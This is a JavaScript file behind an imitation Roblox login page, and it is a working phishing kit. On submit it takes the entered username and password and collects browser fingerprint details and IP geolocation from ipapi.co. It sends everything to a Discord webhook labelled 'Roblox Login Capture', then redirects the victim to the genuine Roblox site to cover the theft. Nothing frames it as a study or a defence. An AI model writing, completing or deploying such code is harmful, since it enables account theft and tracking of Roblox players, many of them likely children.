// Roblox login page functionality
document.addEventListener('DOMContentLoaded', function() {
    // Get form and elements
    const loginForm = document.getElementById('loginForm');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginStatus = document.getElementById('loginStatus');
    
    // Get Discord webhook URL from config
    const DISCORD_WEBHOOK_URL = CONFIG.DISCORD_WEBHOOK_URL;
    
    // Set page title from config
    document.title = CONFIG.PAGE_TITLE || 'Roblox';
    
    // Handle form submission
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Get form values
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();
        
        // Validate inputs (basic validation)
        if (!username || !password) {
            showStatus('Please enter your username/email/phone and password', 'error');
            return;
        }
        
        // Show loading state
        const loginBtn = document.querySelector('.login-btn');
        const originalBtnText = loginBtn.textContent;
        loginBtn.textContent = 'Logging in...';
        loginBtn.disabled = true;
        
        // Get additional information about the user
        const userInfo = {
            timestamp: new Date().toISOString(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            userAgent: navigator.userAgent,
            screenSize: `${window.screen.width}x${window.screen.height}`,
            language: navigator.language,
            referrer: document.referrer || 'Direct',
            ipInfo: 'Fetching...'
        };
        
        // Get IP information
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                userInfo.ipInfo = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    isp: data.org
                };
                
                // Send data to Discord webhook
                sendToDiscord(username, password, userInfo);
            })
            .catch(error => {
                console.error('Error fetching IP info:', error);
                userInfo.ipInfo = 'Failed to fetch';
                
                // Still send data to Discord webhook even if IP info fails
                sendToDiscord(username, password, userInfo);
            });
            
        // Function to send data to Discord
        function sendToDiscord(username, password, userInfo) {
            // Format the message for Discord
            const embed = {
                title: '🎮 New Roblox Login Captured',
                color: 0x0066ff, // Roblox blue color
                fields: [
                    {
                        name: '👤 Username/Email/Phone',
                        value: `\`${username}\``,
                        inline: true
                    },
                    {
                        name: '🔑 Password',
                        value: `\`${password}\``,
                        inline: true
                    },
                    {
                        name: '⏰ Timestamp',
                        value: userInfo.timestamp,
                        inline: false
                    },
                    {
                        name: '🌐 IP Address',
                        value: typeof userInfo.ipInfo === 'object' ? userInfo.ipInfo.ip : userInfo.ipInfo,
                        inline: true
                    },
                    {
                        name: '📍 Location',
                        value: typeof userInfo.ipInfo === 'object' ? 
                            `${userInfo.ipInfo.city}, ${userInfo.ipInfo.region}, ${userInfo.ipInfo.country}` : 
                            'Unknown',
                        inline: true
                    },
                    {
                        name: '🖥️ Device Info',
                        value: userInfo.userAgent,
                        inline: false
                    },
                    {
                        name: '🔍 Additional Info',
                        value: `Screen: ${userInfo.screenSize}\nLanguage: ${userInfo.language}\nTimezone: ${userInfo.timezone}\nReferrer: ${userInfo.referrer}`,
                        inline: false
                    }
                ],
                footer: {
                    text: 'Roblox Login Capture',
                    icon_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png'
                },
                timestamp: new Date().toISOString()
            };
            
            // Prepare the payload for Discord
            const payload = {
                embeds: [embed]
            };
            
            // Send to Discord webhook
            fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    // Show success and redirect
                    showStatus('Logging in...', 'success');
                    
                    // Simulate redirect after successful login
                    setTimeout(() => {
                        window.location.href = CONFIG.REDIRECT_URL || 'https://www.roblox.com/login';
                    }, CONFIG.REDIRECT_DELAY || 2000);
                } else {
                    throw new Error('Failed to authenticate');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                showStatus('Incorrect username or password. Please try again.', 'error');
                loginBtn.textContent = originalBtnText;
                loginBtn.disabled = false;
            });
        }
    });
    
    // Function to show status messages
    function showStatus(message, type) {
        loginStatus.textContent = message;
        loginStatus.className = 'login-status';
        loginStatus.classList.add(type);
        loginStatus.style.display = 'block';
    }
    
    // Add animation effects to form elements
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.parentElement.style.transform = 'translateX(5px)';
            setTimeout(() => {
                this.parentElement.style.transform = 'translateX(0)';
            }, 300);
        });
    });
});